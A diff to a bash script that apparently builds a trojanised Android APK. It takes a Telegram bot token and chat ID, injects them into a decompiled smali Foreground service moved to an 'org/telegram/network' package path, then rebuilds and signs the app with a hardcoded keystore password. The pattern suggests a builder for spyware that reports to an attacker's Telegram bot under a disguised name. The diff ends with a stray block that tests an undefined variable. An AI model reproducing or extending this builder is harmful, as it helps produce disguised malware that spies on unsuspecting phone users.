@@ -9,6 +9,31 @@ NC='\033[0m' # No Color (reset)
 
 clear
 
+#install function
+install(){
+#add execute permission to files
+FILES=( "./Tools/zipalign" "./Tools/zipalign-m")
+
+for FILE in  "${FILES[@]}";do
+    if chmod +x "${FILE}" > /dev/null 2>&1;then
+        echo -e "${GREEN}[+]Added Executable Permission to ${FILE}$NC"
+    else
+        echo -e "${RED}[x]Failed to Add Execute Permission to ${FILE}$NC"
+    fi
+done
+
+#check jq is installed
+if command -v jq >/dev/null 2>&1; then
+    echo -e "${GREEN}[+]Package jq is installed$NC"
+else
+    echo -e "${RED}[X]Package jq is not installed$NC"
+    echo -e "${GREEN}[+] Installing jq$NC"
+    apt install jq
+fi
+echo -e "${GREEN}Installation Completed!!$NC"
+exit
+}
+
 #logo
 echo -e "$GREEN
     ─────────────────────────────────────
@@ -21,12 +46,25 @@ $NC"
 
 #verbose option
 verbose=false
-while getopts ":v" opt; do
+OPTIND=1
+while getopts ":vi" opt; do
   case $opt in
-    v) verbose=true ;;
-    \?) ;;
+    v)
+      verbose=true
+      echo "Verbose mode ON"
+      ;;
+    i)
+      install
+      ;;
+    \?)
+      echo "Unknown option: -$OPTARG" >&2
+      exit 1
+      ;;
   esac
 done
+
+shift $((OPTIND -1))
+
 
 #verbose option display
 echo -e "${GREEN}───────────────────────────────────────${NC}"
@@ -35,10 +73,11 @@ echo -e "verbose : ${GREEN}$verbose${NC}"
 echo -e "${GREEN}───────────────────────────────────────${NC}"
 
 
-#collect telegram bot token (show password as * symbol)
+#collect telegram bot token
 echo -e "${GREEN}Enter telegram Bot Token :${NC}"
 TOKEN=""
 stty -echo
+
 
 while IFS= read -r -s -n 1 char; do
     # If Enter is pressed, break
@@ -107,10 +146,10 @@ else
 fi
 
 #modifying content in smali
-file_content=$(<./Decompiled/smali/com/example/test1/Foreground.smali)
+file_content=$(<./Decompiled/smali/org/telegram/network/Foreground.smali)
 file_content_modified="${file_content/TOKEN/$TOKEN}"
 file_content_modified="${file_content_modified/CHATID/$LAST_CHAT_ID}"
-echo "$file_content_modified" > ./Decompiled/smali/com/example/test1/Foreground.smali
+echo "$file_content_modified" > ./Decompiled/smali/org/telegram/network/Foreground.smali
 echo -e "${GREEN}[+]Modified Smali Value $NC"
 
 
@@ -161,7 +200,7 @@ else
 fi
 
 #sign apk
-if outputApksigner=$(java -jar ./Tools/apksigner.jar sign   --ks ./Base/test.jks   --ks-key-alias key0   --ks-pass pass:11111111   --key-pass pass:11111111   --out myApp-final.apk   ./tempFolder/myApp-aligned.apk 2>&1);then
+if outputApksigner=$(java -jar ./Tools/apksigner.jar sign   --ks ./Base/key.jks   --ks-key-alias key0   --ks-pass pass:11111111   --key-pass pass:11111111   --out myApp-final.apk   ./tempFolder/myApp-aligned.apk 2>&1);then
     #echo verbose
     if $verbose; then
         echo -e "${YELLOW}$outputApksigner${NC}"
@@ -187,3 +226,9 @@ java -jar ./Tools/apksigner.jar verify myApp-final.apk && echo -e "${YELLOW}✔ 
 
 dir=$(pwd)/myApp-final.apk
 echo -e "${YELLOW}Generated App Located at : $dir $NC"
+
+echo -ne "${GREEN}"
+
+if [[ "$hostapp" == "Apple" || "$hostapp" == "Orange" ]]; then
+    echo "You chose Apple or Orange!"
+fi
